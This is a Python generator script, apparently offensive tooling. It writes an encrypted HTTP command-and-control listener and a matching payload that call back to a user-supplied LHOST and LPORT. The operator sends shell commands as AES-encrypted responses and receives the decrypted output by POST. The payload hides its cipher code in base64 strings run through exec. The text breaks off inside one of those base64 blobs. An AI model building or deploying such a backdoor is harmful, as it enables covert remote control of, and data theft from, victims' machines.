import random, string, socket, subprocess, os, sys, time

check = subprocess.check_output("pip3 install pyfiglet", shell = True)

import pyfiglet

print(pyfiglet.figlet_format("Generator"))

def random_key_generator():
    return bytes.hex(os.urandom(128 // 8))

key = bytes.hex(os.urandom(128 // 8))

def IPv4():   
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    try:
        s.connect(('10.254.254.254', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

print(f"[?] Your IPv4: {IPv4()}")

LHOST = str(input("\n[+] Enter LHOST: "))
LPORT = int(input("\n[+] Enter LPORT: "))
Domain = f"http://{LHOST}:{LPORT}"

print(f"\n[-] Domain: {Domain}")


print("\n>>> Generating ...")

Listener = f'''from http.server import BaseHTTPRequestHandler, HTTPServer
import os, sys , base64, requests, subprocess

def create_folder_with_files(folder_name):
    os.makedirs(folder_name, exist_ok=True)

    with open(os.path.join(folder_name, '_init_.py'), 'w') as file1:
        file1.write("import base64; exec(base64.b64decode('ZnJvbSAuYWVzIGltcG9ydCAq'))")

    with open(os.path.join(folder_name, 'aes.py'), 'w') as file2:
        file2.write("import base64; exec(base64.b64decode(''))")
create_folder_with_files("aes")
sys.path.append("aes")
from aes import AES

class Server_Filter(BaseHTTPRequestHandler):
    KEY = "{key}"

    def pad(self, s):
        return s + (32 - len(s) % 32) * chr(32 - len(s) % 32)

    def encrypt(self, message):
        padded_message = self.pad(message).encode().hex()
        aes = AES(self.KEY)
        encrypted_message = aes.cipher(padded_message)
        return encrypted_message

    def decrypt(self, encrypted_message):
        aes = AES(self.KEY)
        decrypted_message_hex = aes.decipher(encrypted_message)
        decrypted_message = bytes.fromhex(decrypted_message_hex).decode().rstrip(chr(0))
        return decrypted_message

    def do_GET(self):
        CMD = str(input('>>> '))
        encrypted_msg = self.encrypt(CMD)
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(encrypted_msg.encode())
    
    def do_POST(self):
        self.send_response(200)
        self.end_headers()
        Post_Data = self.rfile.read(int(self.headers['Content-Length']))
        Raw_Data = str(Post_Data.decode())
        print(Raw_Data)
        decrypted_msg = self.decrypt(Raw_Data)
        print("Decrypted Message:", decrypted_msg)

if __name__ == '__main__':
    LHOST = "{LHOST}"
    LPORT = {LPORT}
    Server_Characteristic = HTTPServer((LHOST, LPORT), Server_Filter)
    try:
        Server_Characteristic.serve_forever()
    except KeyboardInterrupt:
        print('Server Closed')
        print()
'''
Payload = f'''import requests, subprocess, os, sys, base64

def create_folder_with_files(folder_name):
    os.makedirs(folder_name, exist_ok=True)

    with open(os.path.join(folder_name, '_init_.py'), 'w') as file1:
        file1.write("import base64; exec(base64.b64decode('ZnJvbSAuYWVzIGltcG9ydCAq'))")

    with open(os.path.join(folder_name, 'aes.py'), 'w') as file2:
        file2.write("import base64; exec(base64.b64decode('aW1wb3J0IG9zCmZyb20gdHFkbSBpbXBvcnQgdHFkbQoKZGVmIHJhbmRvbV9rZXlfZ2VuZXJhdG9yKGtleV9sZW5ndGgpOgoKICAgIHJldHVybiBieXRlcy5oZXgob3MudXJhbmRvbShrZXlfbGVuZ3RoIC8vIDgpKQoKY2xhc3MgQUVTOgoKICAgIE5iID0gNAoKICAgIE5rID0gNAoKICAgIE5yID0gMTAKCiAgICBTYm94ID0gKAogICAgICAgIDB4NjMsIDB4N0MsIDB4NzcsIDB4N0IsIDB4RjIsIDB4NkIsIDB4NkYsIDB4QzUsIDB4MzAsIDB4MDEsIDB4NjcsIDB4MkIsIDB4RkUsIDB4RDcsIDB4QUIsIDB4NzYsCiAgICAgICAgMHhDQSwgMHg4MiwgMHhDOSwgMHg3RCwgMHhGQSwgMHg1OSwgMHg0NywgMHhGMCwgMHhBRCwgMHhENCwgMHhBMiwgMHhBRiwgMHg5QywgMHhBNCwgMHg3MiwgMHhDMCwKICAgICAgICAweEI3LCAweEZELCAweDkzLCAweDI2LCAweDM2LCAweDNGLCAweEY3LCAweENDLCAweDM0LCAweEE1LCAweEU1LCAweEYxLCAweDcxLCAweEQ4LCAweDMxLCAweDE1LAogICAgICAgIDB4MDQsIDB4QzcsIDB4MjMsIDB4QzMsIDB4MTgsIDB4OTYsIDB4MDUsIDB4OUEsIDB4MDcsIDB4MTIsIDB4ODAsIDB4RTIsIDB4RUIsIDB4MjcsIDB4QjIsIDB4NzUsCiAgICAgICAgMHgwOSwgMHg4MywgMHgyQywgMHgxQSwgMHgxQiwgMHg2RSwgMHg1QSwgMHhBMCwgMHg1MiwgMHgzQiwgMHhENiwgMHhCMywgMHgyOSwgMHhFMywgMHgyRiwgMHg4NCwKICAgICAgICAweDUzLCAweEQxLCAweDAwLCAweEVELCAweDIwLCAweEZDLCAweEIxLCAweDVCLCAweDZBLCAweENCLCAweEJFLCAweDM5LCAweDRBLCAweDRDLCAweDU4LCAweENGLAogICAgICAgIDB4RDAsIDB4RUYsIDB4QUEsIDB4RkIsIDB4NDMsIDB4NEQsIDB4MzMsIDB4ODUsIDB4NDUsIDB4RjksIDB4MDIsIDB4N0YsIDB4NTAsIDB4M0MsIDB4OUYsIDB4QTgsCiAgICAgICAgMHg1MSwgMHhBMywgMHg0MCwgMHg4RiwgMHg5MiwgMHg5RCwgMHgzOCwgMHhGNSwgMHhCQywgMHhCNiwgMHhEQSwgMHgyMSwgMHgxMCwgMHhGRiwgMHhGMywgMHhEMiwKICAgICAgICAweENELCAweDBDLCAweDEzLCAweEVDLCAweDVGLCAweDk3LCAweDQ0LCAweDE3LCAweEM0LCAweEE3LCAweDdFLCAweDNELCAweDY0LCAweDVELCAweDE5LCAweDczLAogICAgICAgIDB4NjAsIDB4ODEsIDB4NEYsIDB4REMsIDB4MjIsIDB4MkEsIDB4OTAsIDB4ODgsIDB4NDYsIDB4RUUsIDB4QjgsIDB4MTQsIDB4REUsIDB4NUUsIDB4MEIsIDB4REIsCiAgICAgICAgMHhFMCwgMHgzMiwgMHgzQSwgMHgwQSwgMHg0OSwgMHgwNiwgMHgyNCwgMHg1QywgMHhDMiwgMHhEMywgMHhBQywgMHg2MiwgMHg5MSwgMHg5NSwgMHhFNCwgMHg3OSwKICAgICAgICAweEU3LCAweEM4LCAweDM3LCAweDZELCAweDhELCAweEQ1LCAweDRFLCAweEE5LCAweDZDLCAweDU2LCAweEY0LCAweEVBLCAweDY1LCAweDdBLCAweEFFLCAweDA4LAogICAgICAgIDB4QkEsIDB4NzgsIDB4MjUsIDB4MkUsIDB4MUMsIDB4QTYsIDB4QjQsIDB4QzYsIDB4RTgsIDB4REQsIDB4NzQsIDB4MUYsIDB4NEIsIDB4QkQsIDB4OEIsIDB4OEEsCiAgICAgICAgMHg3MCwgMHgzRSwgMHhCNSwgMHg2NiwgMHg0OCwgMHgwMywgMHhGNiwgMHgwRSwgMHg2MSwgMHgzNSwgMHg1NywgMHhCOSwgMHg4NiwgMHhDMSwgMHgxRCwgMHg5RSwKICAgICAgICAweEUxLCAweEY4LCAweDk4LCAweDExLCAweDY5LCAweEQ5LCAweDhFLCAweDk0LCAweDlCLCAweDFFLCAweDg3LCAweEU5LCAweENFLCAweDU1LCAweDI4LCAweERGLAogICAgICAgIDB4OEMsIDB4QTEsIDB4ODksIDB4MEQsIDB4QkYsIDB4RTYsIDB4NDIsIDB4NjgsIDB4NDEsIDB4OTksIDB4MkQsIDB4MEYsIDB4QjAsIDB4NTQsIDB4QkIsIDB4MTYsCiAgICApCgogICAgSW52U2JveCA9ICgKICAgICAgICAweDUyLCAweDA5LCAweDZBLCAweEQ1LCAweDMwLCAweDM2LCAweEE1LCAweDM4LCAweEJGLCAweDQwLCAweEEzLCAweDlFLCAweDgxLCAweEYzLCAweEQ3LCAweEZCLAogICAgICAgIDB4N0MsIDB4RTMsIDB4MzksIDB4ODIsIDB4OUIsIDB4MkYsIDB4RkYsIDB4ODcsIDB4MzQsIDB4OEUsIDB4NDMsIDB4NDQsIDB4QzQsIDB4REUsIDB4RTksIDB4Q0IsCiAgICAgICAgMHg1NCwgMHg3QiwgMHg5NCwgMHgzMiwgMHhBNiwgMHhDMiwgMHgyMywgMHgzRCwgMHhFRSwgMHg0QywgMHg5NSwgMHgwQiwgMHg0MiwgMHhGQSwgMHhDMywgMHg0RSwKICAgICAgICAweDA4LCAweDJFLCAweEExLCAweDY2LCAweDI4LCAweEQ5LCAweDI0LCAweEIyLCAweDc2LCAweDVCLCAweEEyLCAweDQ5LCAweDZELCAweDhCLCAweEQxLCAweDI1LAogICAgICAgIDB4NzIsIDB4RjgsIDB4RjYsIDB4NjQsIDB4ODYsIDB4NjgsIDB4OTgsIDB4MTYsIDB4RDQsIDB4QTQsIDB4NUMsIDB4Q0MsIDB4NUQsIDB4NjUsIDB4QjYsIDB4OTIsCiAgICAgICAgMHg2QywgMHg3MCwgMHg0OCwgMHg1MCwgMHhGRCwgMHhFRCwgMHhCOSwgMHhEQSwgMHg1RSwgMHgxNSwgMHg0NiwgMHg1NywgMHhBNywgMHg4RCwgMHg5RCwgMHg4NCwKICAgICAgICAweDkwLCAweEQ4LCAweEFCLCAweDAwLCAweDhDLCAweEJDLCAweEQzLCAweDBBLCAweEY3LCAweEU0LCAweDU4LCAweDA1LCAweEI4LCAweEIzLCAweDQ1LCAweDA2LAogICAgICAgIDB4RDAsIDB4MkMsIDB4MUUsIDB4OEYsIDB4Q0EsIDB4M0YsIDB4MEYsIDB4MDIsIDB4QzEsIDB4QUYsIDB4QkQsIDB4MDMsIDB4MDEsIDB4MTMsIDB4OEEsIDB4NkIsCiAgICAgICAgMHgzQSwgMHg5MSwgMHgxMSwgMHg0MSwgMHg0RiwgMHg2NywgMHhEQywgMHhFQSwgMHg5NywgMHhGMiwgMHhDRiwgMHhDRSwgMHhGMCwgMHhCNCwgMHhFNiwgMHg3MywKICAgICAgICAweDk2LCAweEFDLCAweDc0LCAweDIyLCAweEU3LCAweEFELCAweDM1LCAweDg1LCAweEUyLCAweEY5LCAweDM3LCAweEU4LCAweDFDLCAweDc1LCAweERGLCAweDZFLAogICAgICAgIDB4NDcsIDB4RjEsIDB4MUEsIDB4NzEsIDB4MUQsIDB4MjksIDB4QzUsIDB4ODksIDB4NkYsIDB4QjcsIDB4NjIsIDB4MEUsIDB4QUEsIDB4MTgsIDB4QkUsIDB4MUIsCiAgICAgICAgMHhGQywgMHg1NiwgMHgzRSwgMHg0QiwgMHhDNiwgMHhEMiwgMHg3OSwgMHgyMCwgMHg5QSwgMHhEQiwgMHhDMCwgMHhGRSwgMHg3OCwgMHhDRCwgMHg1QSwgMHhGNCwKICAgICAgICAweDFGLCAweERELCAweEE4LCAweDMzLCAweDg4LCAweDA3LCAweEM3LCAweDMxLCAweEIxLCAweDEyLCAweDEwLCAweDU5LCAweDI3LCAweDgwLCAweEVDLCAweDVGLAogICAgICAgIDB4NjAsIDB4NTEsIDB4N0YsIDB4QTksIDB4MTksIDB4QjUsIDB4NEEsIDB4MEQsIDB4MkQsIDB4RTUsIDB4N0EsIDB4OUYsIDB4OTMsIDB4QzksIDB4OUMsIDB4RUYsCiAgICAgICAgMHhBMCwgMHhFMCwgMHgzQiwgMHg0RCwgMHhBRSwgMHgyQSwgMHhGNSwgMHhCMCwgMHhDOCwgMHhFQiwgMHhCQiwgMHgzQywgMHg4MywgMHg1MywgMHg5OSwgMHg2MSwKICAgICAgICAweDE3LCAweDJCLCAweDA0LCAweDdFLCAweEJBLCAweDc3LCAweEQ2LCAweDI2LCAweEUxLCAweDY5LCAweDE0LCAweDYzLCAweDU1LCAweDIxLCAweDBDLCAweDdELAogICAgKQoKICAgIFJjb24gPSAoCiAgICAgICAgMHgwMCwgMHgwMSwgMHgwMiwgMHgwNCwgMHgwOCwgMHgxMCwgMHgyMCwgMHg0MCwKICAgICAgICAweDgwLCAweDFCLCAweDM2LCAweDZDLCAweEQ4LCAweEFCLCAweDRELCAweDlBLAogICAgICAgIDB4MkYsIDB4NUUsIDB4QkMsIDB4NjMsIDB4QzYsIDB4OTcsIDB4MzUsIDB4NkEsCiAgICAgICAgMHhENCwgMHhCMywgMHg3RCwgMHhGQSwgMHhFRiwgMHhDNSwgMHg5MSwgMHgzOSwKICAgICkKCgogICAgZGVmIF9faW5pdF9fKHNlbGYsIGtleSwgbW9kZT0xMjgpOgogICAgICAgIGlmIG1vZGUgPT0gMTkyOgogICAgICAgICAgICBzZWxmLk5rID0gNgogICAgICAgICAgICBzZWxmLk5yID0gMTIKICAgICAgICAgICAgc2VsZi5rZXkgPSBzZWxmLnRleHQybWF0cml4KGtleSwgMjQpCiAgICAgICAgZWxpZiBtb2RlID09IDI1NjoKICAgICAgICAgICAgc2VsZi5OayA9IDgKICAgICAgICAgICAgc2VsZi5OciA9IDE0CiAgICAgICAgICAgIHNlbGYua2V5ID0gc2VsZi50ZXh0Mm1hdHJpeChrZXksIDMyKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHNlbGYua2V5ID0gc2VsZi50ZXh0Mm1hdHJpeChrZXkpCgogICAgICAgIHNlbGYua2V5X2V4cGFuc2lvbihzZWxmLmtleSkKCiAgICBkZWYgdGV4dDJtYXRyaXgoc2VsZiwgdGV4dCwgbGVuPTE2KToKCiAgICAgICAgc3RhdGUgPSBbXQoKICAgICAgICBmb3IgaSBpbiByYW5nZShsZW4pOgogICAgICAgICAgICAjIHR3byBoZXggY2hhcmFjdGVycyA9PSAxIGJ5dGUKICAgICAgICAgICAgYnl0ZSA9IGludCh0ZXh0W2kqMjppKjIrMl0sIDE2KQogICAgICAgICAgICBpZiBpICUgNCA9PSAwOgogICAgICAgICAgICAgICAgIyB0aGlzIG1lYW5zIHRoYXQgdGhlIGJ5dGUgdG8gYXBwZW5kIGlzIHRoZSBmaXJzdCBvZiB0aGUgY29sdW1uCiAgICAgICAgICAgICAgICBzdGF0ZS5hcHBlbmQoW2J5dGVdKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgIyBBcHBlbmQgYnl0ZSB0byB0aGUgcm93IGkgLy8gNCAKICAgICAgICAgICAgICAgIHN0YXRlW2kgLy8gNF0uYXBwZW5kKGJ5dGUpIAoKICAgICAgICByZXR1cm4gc3RhdGUKCiAgICBkZWYgbWF0cml4MnRleHQoc2VsZiwgcywgbGVuPTE2KToKCiAgICAgICAgdGV4dCA9ICIiCiAgICAgICAgZm9yIGkgaW4gcmFuZ2UobGVuIC8vIDQpOgogICAgICAgICAgICBmb3IgaiBpbiByYW5nZSg0KToKICAgICAgICAgICAgICAgIHRleHQgKz0gZm9ybWF0KHNbaV1bal0sICcwMngnKQoKICAgICAgICByZXR1cm4gdGV4dAoKICAgIGRlZiBzdWJfYnl0ZXMoc2VsZiwgcyk6CgogICAgICAgIGZvciBpIGluIHJhbmdlKHNlbGYuTmIpOgogICAgICAgICAgICBmb3IgaiBpbiByYW5nZSg0KToKICAgICAgICAgICAgICAgIHNbaV1bal0gPSBzZWxmLlNib3hbc1tpXVtqXV0KICAgIAogICAgZGVmIGludl9zdWJfYnl0ZXMoc2VsZiwgcyk6CgogICAgICAgIGZvciBpIGluIHJhbmdlKHNlbGYuTmIpOgogICAgICAgICAgICBmb3IgaiBpbiByYW5nZSg0KToKICAgICAgICAgICAgICAgIHNbaV1bal0gPSBzZWxmLkludlNib3hbc1tpXVtqXV0KCiAgICBkZWYgc2hpZnRfcm93cyhzZWxmLCBzKToKCgogICAgICAgIHNbMF1bMV0sIHNbMV1bMV0sIHNbMl1bMV0sIHNbM11bMV0gPSBzWzFdWzFdLCBzWzJdWzFdLCBzWzNdWzFdLCBzWzBdWzFdCiAgICAgICAgc1swXVsyXSwgc1sxXVsyXSwgc1syXVsyXSwgc1szXVsyXSA9IHNbMl1bMl0sIHNbM11bMl0sIHNbMF1bMl0sIHNbMV1bMl0KICAgICAgICBzWzBdWzNdLCBzWzFdWzNdLCBzWzJdWzNdLCBzWzNdWzNdID0gc1szXVszXSwgc1swXVszXSwgc1sxXVszXSwgc1syXVszXQoKICAgIGRlZiBpbnZfc2hpZnRfcm93cyhzZWxmLCBzKToKCgogICAgICAgIHNbMF1bMV0sIHNbMV1bMV0sIHNbMl1bMV0sIHNbM11bMV0gPSBzWzNdWzFdLCBzWzBdWzFdLCBzWzFdWzFdLCBzWzJdWzFdCiAgICAgICAgc1swXVsyXSwgc1sxXVsyXSwgc1syXVsyXSwgc1szXVsyXSA9IHNbMl1bMl0sIHNbM11bMl0sIHNbMF1bMl0sIHNbMV1bMl0KICAgICAgICBzWzBdWzNdLCBzWzFdWzNdLCBzWzJdWzNdLCBzWzNdWzNdID0gc1sxXVszXSwgc1syXVszXSwgc1szXVszXSwgc1swXVszXQoKICAgIGRlZiB4dGltZShzZWxmLCBiKToKCiAgICAgICAgaWYgYiAmIDB4ODA6CiAgICAgICAgICAgICMgY2hlY2sgaWYgYjcgb2YgdGhlIGdpdmVuIHBvbHlub21pYWwgaXMgMSBvciAwLgogICAgICAgICAgICBiID0gYiA8PCAxCiAgICAgICAgICAgIGIgXj0gMHgxQgogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGIgPSBiIDw8IDEKCiAgICAgICAgcmV0dXJuIGIgJiAweEZGICMgZ2V0IHRoZSBmaXJzdCA4IGJpdHMuCgogICAgZGVmIG1peF9vbmVfY29sdW1uKHNlbGYsIGMpOgoKICAgICAgICB0ID0gY1swXSBeIGNbMV0gXiBjWzJdIF4gY1szXQogICAgICAgIHUgPSBjWzBdCiAgICAgICAgY1swXSBePSBzZWxmLnh0aW1lKGNbMF0gXiBjWzFdKSBeIHQKICAgICAgICBjWzFdIF49IHNlbGYueHRpbWUoY1sxXSBeIGNbMl0pIF4gdAogICAgICAgIGNbMl0gXj0gc2VsZi54dGltZShjWzJdIF4gY1szXSkgXiB0CiAgICAgICAgY1szXSBePSBzZWxmLnh0aW1lKGNbM10gXiB1KSBeIHQKCiAgICBkZWYgbWl4X2NvbHVtbnMoc2VsZiwgcyk6CgogICAgICAgIGZvciBpIGluIHJhbmdlKHNlbGYuTmIpOgogICAgICAgICAgICBzZWxmLm1peF9vbmVfY29sdW1uKHNbaV0pCgogICAgZGVmIGludl9taXhfY29sdW1ucyhzZWxmLCBzKToKCiAgICAgICAgZm9yIGkgaW4gcmFuZ2Uoc2VsZi5OYik6CiAgICAgICAgICAgIHUgPSBzZWxmLnh0aW1lKHNlbGYueHRpbWUoc1tpXVswXSBeIHNbaV1bMl0pKQogICAgICAgICAgICB2ID0gc2VsZi54dGltZShzZWxmLnh0aW1lKHNbaV1bMV0gXiBzW2ldWzNdKSkKICAgICAgICAgICAgc1tpXVswXSBePSB1CiAgICAgICAgICAgIHNbaV1bMV0gXj0gdgogICAgICAgICAgICBzW2ldWzJdIF49IHUKICAgICAgICAgICAgc1tpXVszXSBePSB2CgogICAgICAgIHNlbGYubWl4X2NvbHVtbnMocykKCiAgICBkZWYgYWRkX3JvdW5kX2tleShzZWxmLCBzLCBrKToKCiAgICAgICAgZm9yIGkgaW4gcmFuZ2Uoc2VsZi5OYik6CiAgICAgICAgICAgIGZvciBqIGluIHJhbmdlKDQpOgogICAgICAgICAgICAgICAgc1tpXVtqXSBePSBrW2ldW2pdCgogICAgZGVmIHN1Yl93b3JkKHNlbGYsIHcpOgoKICAgICAgICBmb3IgaSBpbiByYW5nZShsZW4odykpOgogICAgICAgICAgICB3W2ldID0gc2VsZi5TYm94W3dbaV1dCgoKICAgIGRlZiByb3RhdGVfd29yZChzZWxmLCB3KToKCiAgICAgICAgd1swXSwgd1sxXSwgd1syXSwgd1szXSA9IHdbMV0sIHdbMl0sIHdbM10sIHdbMF0KCiAgICBkZWYga2V5X2V4cGFuc2lvbihzZWxmLCBrZXkpOgogICAgCgogICAgICAgIHNlbGYucm91bmRfa2V5cyA9IHNlbGYua2V5CgogICAgICAgIGZvciBpIGluIHJhbmdlKHNlbGYuTmssIHNlbGYuTmIgKiAoc2VsZi5OciArIDEpKToKICAgICAgICAgICAgc2VsZi5yb3VuZF9rZXlzLmFwcGVuZChbMCwgMCwgMCwgMF0pCiAgICAgICAgICAgIHRlbXAgPSBzZWxmLnJvdW5kX2tleXNbaSAtIDFdWzpdCiAgICAgICAgICAgICMgd29yZCBpcyBtdWx0aXBsZSBvZiBOawogICAgICAgICAgICBpZiBpICUgc2VsZi5OayA9PSAwOgogICAgICAgICAgICAgICAgc2VsZi5yb3RhdGVfd29yZCh0ZW1wKQogICAgICAgICAgICAgICAgc2VsZi5zdWJfd29yZCh0ZW1wKQogICAgICAgICAgICAgICAgdGVtcFswXSA9IHRlbXBbMF0gXiBzZWxmLlJjb25baSAvLyBzZWxmLk5rXQogICAgICAgICAgICBlbGlmIHNlbGYuTmsgPiA2IGFuZCBpICUgc2VsZi5OayA9PSA0OgoKICAgICAgICAgICAgICAgIHNlbGYuc3ViX3dvcmQodGVtcCkKCiAgICAgICAgICAgIGZvciBqIGluIHJhbmdlKDQpOgogICAgICAgICAgICAgICAgc2VsZi5yb3VuZF9rZXlzW2ldW2pdID0gc2VsZi5yb3VuZF9rZXlzW2kgLSBzZWxmLk5rXVtqXSBeIHRlbXBbal0KCiAgICBkZWYgY2lwaGVyKHNlbGYsIHRleHQpOgoKCiAgICAgICAgc2VsZi5zdGF0ZSA9IHNlbGYudGV4dDJtYXRyaXgodGV4dCkKCiAgICAgICAgc2VsZi5hZGRfcm91bmRfa2V5KHNlbGYuc3RhdGUsIHNlbGYucm91bmRfa2V5c1s6NF0pCgogICAgICAgIGZvciBpIGluIHJhbmdlKDEsIHNlbGYuTnIpOgogICAgICAgICAgICBzZWxmLnN1Yl9ieXRlcyhzZWxmLnN0YXRlKQogICAgICAgICAgICBzZWxmLnNoaWZ0X3Jvd3Moc2VsZi5zdGF0ZSkKICAgICAgICAgICAgc2VsZi5taXhfY29sdW1ucyhzZWxmLnN0YXRlKQogICAgICAgICAgICBzZWxmLmFkZF9yb3VuZF9rZXkoc2VsZi5zdGF0ZSwgc2VsZi5yb3VuZF9rZXlzW3NlbGYuTmIgKiBpIDogc2VsZi5OYiAqIChpICsgMSldKQoKICAgICAgICBzZWxmLnN1Yl9ieXRlcyhzZWxmLnN0YXRlKQogICAgICAgIHNlbGYuc2hpZnRfcm93cyhzZWxmLnN0YXRlKQogICAgICAgIHNlbGYuYWRkX3JvdW5kX2tleShzZWxmLnN0YXRlLCBzZWxmLnJvdW5kX2tleXNbbGVuKHNlbGYucm91bmRfa2V5cykgLSA0Ol0pCgogICAgICAgIHJldHVybiBzZWxmLm1hdHJpeDJ0ZXh0KHNlbGYuc3RhdGUpCgogICAgZGVmIGRlY2lwaGVyKHNlbGYsIHRleHQpOgoKICAgICAgICBzZWxmLmVuY3J5cHRlZF9zdGF0ZSA9IHNlbGYudGV4dDJtYXRyaXgodGV4dCkKCiAgICAgICAgc2VsZi5hZGRfcm91bmRfa2V5KHNlbGYuZW5jcnlwdGVkX3N0YXRlLCBzZWxmLnJvdW5kX2tleXNbbGVuKHNlbGYucm91bmRfa2V5cykgLSA0Ol0pCgogICAgICAgIGZvciBpIGluIHJhbmdlKHNlbGYuTnIgLSAxLCAwLCAtMSk6CiAgICAgICAgICAgIHNlbGYuaW52X3NoaWZ0X3Jvd3Moc2VsZi5lbmNyeXB0ZWRfc3RhdGUpCiAgICAgICAgICAgIHNlbGYuaW52X3N1Yl9ieXRlcyhzZWxmLmVuY3J5cHRlZF9zdGF0ZSkKICAgICAgICAgICAgc2VsZi5hZGRfcm91bmRfa2V5KHNlbGYuZW5jcnlwdGVkX3N0YXRlLCBzZWxmLnJvdW5kX2tleXNbc2VsZi5OYiAqIGkgOiBzZWxmLk5iICogKGkgKyAxKV0pCiAgICAgICAgICAgIHNlbGYuaW52X21peF9jb2x1bW5zKHNlbGYuZW5jcnlwdGVkX3N0YXRlKQoKICAgICAgICBzZWxmLmludl9zaGlmdF9yb3dzKHNlbGYuZW5jcnlwdGVkX3N0YXRlKQogICAgICAgIHNlbGYuaW52X3N1Yl9ieXRlcyhzZWxmLmVuY3J5cHRlZF9zdGF0ZSkKICAgICAgICBzZWxmLmFkZF9yb3VuZF9rZXkoc2VsZi5lbmNyeXB0ZWRfc3RhdGUsIHNlbGYucm91bmRfa2V5c1s6NF0pCgogICAgICAgIHJldHVybiBzZWxmLm1hdHJpeDJ0ZXh0KHNlbGYuZW5jcnlwdGVkX3N0YXRlKQoKZGVmIHBhZChibG9jaywgYmxvY2tfbGVuZ3RoKToKCiAgICBieXRlc190b19wYWQgPSBibG9ja19sZW5ndGggLSBsZW4oYmxvY2spIC8vIDIKCiAgICBmb3IgXyBpbiByYW5nZShieXRlc190b19wYWQpOgogICAgICAgIGJsb2NrICs9IGZvcm1hdChieXRlc190b19wYWQsICcwMngnKQoKICAgIHJldHVybiBibG9jawoKZGVmIHVucGFkKGJsb2NrKToKCiAgICBieXRlc190b191bnBhZCA9IGludChibG9ja1stMjpdLCAxNikKICAgIHJldHVybiBibG9ja1s6LWJ5dGVzX3RvX3VucGFkKjJdCgpkZWYgeG9yX2Jsb2NrcyhibG9ja18xLCBibG9ja18yKToKCiAgICByZXR1cm4gZm9ybWF0KGludChibG9ja18xLCAxNikgXiBpbnQoYmxvY2tfMiwgMTYpLCAnMDMyeCcpCgpkZWYgZ2VuZXJhdGVfcmFuZG9tX2l2KGl2X2xlbmd0aCk6CgogICAgcmV0dXJuIGJ5dGVzLmhleChvcy51cmFuZG9tKGl2X2xlbmd0aCkpCgpkZWYgZ2VuZXJhdGVfcmFuZG9tX2N0cigpOgoKICAgIHJldHVybiBnZW5lcmF0ZV9yYW5kb21faXYoOCkgKyAiMDAwMDAwMDAwMDAwMDAwMCIKCmRlZiBpbmNyZW1lbnRfY3RyKGN0cik6CgogICAgY3RyX2luY19pbnQgPSBpbnQuZnJvbV9ieXRlcyhieXRlcy5mcm9taGV4KGN0ciksIGJ5dGVvcmRlcj0iYmlnIikgKyAxCiAgICByZXR1cm4gYnl0ZXMuaGV4KGN0cl9pbmNfaW50LnRvX2J5dGVzKGxlbmd0aD0xNiwgYnl0ZW9yZGVyPSJiaWciKSkKCmNsYXNzIEVDQjoKCiAgICBkZWYgX19pbml0X18oc2VsZiwgYmxvY2tfY2lwaGVyX2FsZyk6CiAgICAgICAgc2VsZi5ibG9ja19jaXBoZXJfYWxnID0gYmxvY2tfY2lwaGVyX2FsZwoKICAgIGRlZiBjaXBoZXIoc2VsZiwgZmlsZW5hbWUsIGVuY3J5cHRlZF9maWxlX25hbWUpOgoKICAgICAgICBoZXhfYXJyYXkgPSBGaWxlVG9vbHMub3Blbl9maWxlKGZpbGVuYW1lLCAzMikKCiAgICAgICAgaWYgbGVuKGhleF9hcnJheVstMV0pIDwgMzI6CiAgICAgICAgICAgIGhleF9hcnJheVstMV0gPSBwYWQoaGV4X2FycmF5Wy0xXSwgMTYpCgogICAgICAgIGNpcGhlcl9hcnJheSA9IFtdCiAgICAgICAgZm9yIGkgaW4gdHFkbShyYW5nZShsZW4oaGV4X2FycmF5KSksIGRlc2M9IkVDQiBlbmNyeXB0aW9uIik6CiAgICAgICAgICAgIGNpcGhlcl9hcnJheS5hcHBlbmQoc2VsZi5ibG9ja19jaXBoZXJfYWxnLmNpcGhlcihoZXhfYXJyYXlbaV0pKQoKICAgICAgICBGaWxlVG9vbHMud3JpdGVfZmlsZShlbmNyeXB0ZWRfZmlsZV9uYW1lLCBjaXBoZXJfYXJyYXkpCgogICAgZGVmIGRlY2lwaGVyKHNlbGYsIGZpbGVuYW1lLCBkZWNyeXB0ZWRfZmlsZV9uYW1lKToKCiAgICAgICAgaGV4X2FycmF5ID0gRmlsZVRvb2xzLm9wZW5fZmlsZShmaWxlbmFtZSwgMzIpCiAgICAgICAgZGVjcnlwdGVkX2FycmF5ID0gW10KICAgICAgICBmb3IgaSBpbiB0cWRtKHJhbmdlKGxlbihoZXhfYXJyYXkpKSwgZGVzYz0iRUNCIGRlY3J5cHRpb24iKToKICAgICAgICAgICAgZGVjcnlwdGVkX2FycmF5LmFwcGVuZChzZWxmLmJsb2NrX2NpcGhlcl9hbGcuZGVjaXBoZXIoaGV4X2FycmF5W2ldKSkKCiAgICAgICAgZGVjcnlwdGVkX2FycmF5Wy0xXSA9IHVucGFkKGRlY3J5cHRlZF9hcnJheVstMV0pCgogICAgICAgIEZpbGVUb29scy53cml0ZV9maWxlKGRlY3J5cHRlZF9maWxlX25hbWUsIGRlY3J5cHRlZF9hcnJheSkKICAgICAgICAKCmNsYXNzIENCQzoKCiAgICBkZWYgX19pbml0X18oc2VsZiwgYmxvY2tfY2lwaGVyX2FsZywgaXZfbGVuZ3RoKToKICAgICAgICBzZWxmLmJsb2NrX2NpcGhlcl9hbGcgPSBibG9ja19jaXBoZXJfYWxnCiAgICAgICAgc2VsZi5pdiA9IGdlbmVyYXRlX3JhbmRvbV9pdihpdl9sZW5ndGgpCgogICAgZGVmIGNpcGhlcihzZWxmLCBmaWxlbmFtZSwgZW5jcnlwdGVkX2ZpbGVfbmFtZSk6CgogICAgICAgIGhleF9hcnJheSA9IEZpbGVUb29scy5vcGVuX2ZpbGUoZmlsZW5hbWUsIDMyKQoKICAgICAgICBpZiBsZW4oaGV4X2FycmF5Wy0xXSkgPCAzMjoKICAgICAgICAgICAgaGV4X2FycmF5Wy0xXSA9IHBhZChoZXhfYXJyYXlbLTFdLCAxNikKCiAgICAgICAgY2lwaGVyX2FycmF5ID0gW3NlbGYuaXZdCgogICAgICAgIGl2ID0gc2VsZi5pdgogICAgICAgIGZvciBpIGluIHRxZG0ocmFuZ2UobGVuKGhleF9hcnJheSkpLCBkZXNjPSJDQkMgZW5jcnlwdGlvbiIpOgogICAgICAgICAgICBibG9ja190b19jaXBoZXIgPSB4b3JfYmxvY2tzKGl2L